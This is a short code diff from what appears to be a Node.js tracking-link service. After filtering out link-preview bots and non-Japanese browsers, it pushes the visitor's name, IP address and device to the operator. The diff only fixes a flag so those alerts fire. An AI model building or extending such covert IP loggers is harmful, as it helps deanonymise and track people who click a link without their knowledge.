@@ -109,7 +109,9 @@ app
       req.headers["user-agent"] === 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36' || 
       req.headers["accept-language"] !== 'ja' || 
       req.headers["user-agent"] === 'bitlybot/3.0 (+http://bit.ly/)' 
-    ) {push_status = false};
+    ) {push_status = false} else {
+      push_status = true;
+    };
     if(push_status) {
       pushMsg(`${nom}さんがURLにアクセスしました\nIPアドレス: ${str}\n使用デバイス: ${req.headers["user-agent"]}`, id);
       console.log(`名前: ${nom}\nIPアドレス: ${str}`);
